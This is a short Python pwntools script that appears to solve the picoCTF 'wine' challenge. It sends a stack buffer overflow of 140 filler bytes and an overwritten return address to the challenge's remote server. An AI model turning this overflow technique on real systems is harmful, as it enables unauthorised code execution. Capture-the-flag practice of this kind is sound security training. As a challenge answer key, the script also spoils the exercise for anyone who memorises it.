# wine solution

from binascii import hexlify
from pwn import *
context.log_level = "debug" 

site = "saturn.picoctf.net"
port = 62481

dest = p32(4199728)
filler = b'\33' * 140
payload = filler + dest


def delivery(payload):

    # Connect to remote app
    s = remote(site, port, timeout=25)
    recv = s.recvline()
    print(recv)
    s.sendline(payload)
    resp = s.recvall()
    s.close()
    return resp



print(delivery(payload))